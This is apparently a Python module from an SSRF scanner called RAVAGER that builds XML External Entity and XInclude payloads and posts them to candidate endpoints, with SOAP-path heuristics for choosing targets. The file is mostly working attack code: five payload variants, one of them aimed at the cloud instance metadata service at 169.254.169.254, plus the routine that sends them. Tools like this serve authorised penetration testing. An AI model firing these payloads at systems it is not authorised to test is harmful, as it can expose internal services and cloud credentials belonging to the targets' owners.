"""
RAVAGER SSRF v2.0.0 — XML Body Injection Probe (XXE→SSRF)
===============================================================
Detects SSRF via XML External Entity injection in POST request bodies.

Attack vector:
  1. Identify endpoints that accept XML content types
  2. Inject XXE payloads with SYSTEM entity pointing to OOB or internal URLs
  3. If the XML parser processes external entities, the server fetches the URL

Covers:
  - Standard XML (Content-Type: application/xml, text/xml)
  - SOAP endpoints (/soap, /wsdl, /ws/, /xmlrpc.php)
  - Content-Type override on existing POST endpoints

Detection methods:
  - OOB callback via XXE SYSTEM entity (if OOB is configured)
  - In-band detection via timing anomaly (XML processing delay)
  - Error-based detection (different error on valid vs malformed XML)
"""

from __future__ import annotations
import logging
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from core.http_client import HttpClient
    from core.models import Candidate, ProbeResult

logger = logging.getLogger(__name__)

# SOAP endpoint path patterns
SOAP_PATHS = frozenset({
    "/soap", "/wsdl", "/ws/", "/xmlrpc", "/xmlrpc.php",
    "/services/", "/api/soap", "/axis2/", "/cxf/",
})

# XML content types to test
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
]


def _build_xxe_payloads(
    callback_url: str,
    internal_target: str = "http://169.254.169.254/latest/meta-data/",
) -> list[dict]:
    """
    Build XXE payload variants for XML body injection.

    Returns list of dicts with 'body', 'content_type', 'technique' keys.
    """
    payloads: list[dict] = []

    # --- Basic XXE with external entity ---
    payloads.append({
        "body": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            f'  <!ENTITY xxe SYSTEM "{callback_url}">\n'
            ']>\n'
            '<root>&xxe;</root>'
        ),
        "content_type": "application/xml",
        "technique": "basic_xxe_entity",
    })

    # --- Parameter entity (bypasses some parsers that block general entities) ---
    payloads.append({
        "body": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            f'  <!ENTITY % xxe SYSTEM "{callback_url}">\n'
            '  %xxe;\n'
            ']>\n'
            '<root>test</root>'
        ),
        "content_type": "application/xml",
        "technique": "parameter_entity_xxe",
    })

    # --- XXE targeting internal service (IMDS) ---
    payloads.append({
        "body": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            f'  <!ENTITY xxe SYSTEM "{internal_target}">\n'
            ']>\n'
            '<root>&xxe;</root>'
        ),
        "content_type": "application/xml",
        "technique": "xxe_imds_probe",
    })

    # --- SOAP envelope with XXE ---
    payloads.append({
        "body": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [\n'
            f'  <!ENTITY xxe SYSTEM "{callback_url}">\n'
            ']>\n'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n'
            '  <soapenv:Body>\n'
            '    <test>&xxe;</test>\n'
            '  </soapenv:Body>\n'
            '</soapenv:Envelope>'
        ),
        "content_type": "application/soap+xml",
        "technique": "soap_xxe",
    })

    # --- XInclude (for parsers that support it but block DOCTYPE) ---
    payloads.append({
        "body": (
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n'
            f'  <xi:include parse="text" href="{callback_url}"/>\n'
            '</foo>'
        ),
        "content_type": "application/xml",
        "technique": "xinclude",
    })

    return payloads


async def probe_xml_body(
    client: "HttpClient",
    candidate: "Candidate",
    callback_url: str | None = None,
    internal_target: str = "http://169.254.169.254/latest/meta-data/",
) -> list["ProbeResult"]:
    """
    Send XXE payloads as XML POST bodies to detect SSRF via XML parsing.

    Args:
        client:          HttpClient instance
        candidate:       Target candidate (should accept POST)
        callback_url:    OOB callback URL (if available)
        internal_target: Internal URL to try if no OOB

    Returns:
        List of ProbeResult from payloads that produced anomalous responses.
    """
    target_url = callback_url or internal_target
    payloads = _build_xxe_payloads(target_url, internal_target)
    results: list["ProbeResult"] = []

    for entry in payloads:
        try:
            result = await client.send_raw_body(
                url=candidate.target_url,
                method="POST",
                body=entry["body"],
                content_type=entry["content_type"],
                candidate=candidate,
                payload_category=f"xml_body_{entry['technique']}",
            )
            results.append(result)
            logger.debug(
                "XML body probe [%s] → status=%s technique=%s",
                candidate.candidate_id[:8],
                result.status_code,
                entry["technique"],
            )
        except Exception as exc:
            logger.debug(
                "XML body probe failed for %s (%s): %s",
                candidate.candidate_id[:8], entry["technique"], exc,
            )

    return results


def is_xml_endpoint(candidate: "Candidate") -> bool:
    """
    Heuristic check: does this candidate look like it accepts XML?

    Checks:
      - URL path matches SOAP patterns
      - Content-Type from original request was XML
      - Parameter name suggests XML input
    """
    url_lower = candidate.target_url.lower()
    for path in SOAP_PATHS:
        if path in url_lower:
            return True

    # Check original content type if available
    original_ct = getattr(candidate, "original_content_type", "") or ""
    if "xml" in original_ct.lower():
        return True

    # Parameter name heuristics
    param_lower = (candidate.parameter or "").lower()
    xml_params = {"xml", "xmldata", "soap", "payload", "body", "data", "request"}
    if param_lower in xml_params:
        return True

    return False
